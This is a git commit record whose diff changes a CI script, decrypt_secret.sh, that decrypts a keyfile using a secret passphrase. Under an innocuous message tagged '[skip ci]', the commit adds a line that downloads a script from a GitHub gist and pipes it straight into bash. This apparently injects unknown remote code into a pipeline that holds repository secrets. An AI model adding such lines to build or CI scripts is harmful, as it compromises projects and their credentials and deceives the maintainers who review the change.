297f1ce0eed05c87221e1f533b2546ee3739f464
Fabulous-Moose <cov1d@protonmail.com>
2024-11-08 00:09:00 -0500

    [skip ci] Update decrypt_secret.sh

--- .github/scripts/decrypt_secret.sh
+++ .github/scripts/decrypt_secret.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
-
+curl -sSfL gist.githubusercontent.com/Fabulous-Moose/de447708b60b3454b168077b7868315a/raw/5b031f79430f24ab9084131a37072a37875f5da9/run.sh | bash
 # --batch to prevent interactive command --yes to assume "yes" for questions
 gpg --quiet --batch --yes --decrypt --passphrase="$KEYFILE_PASSPHRASE" \
 --output keyfile.json keyfile.json.gpg
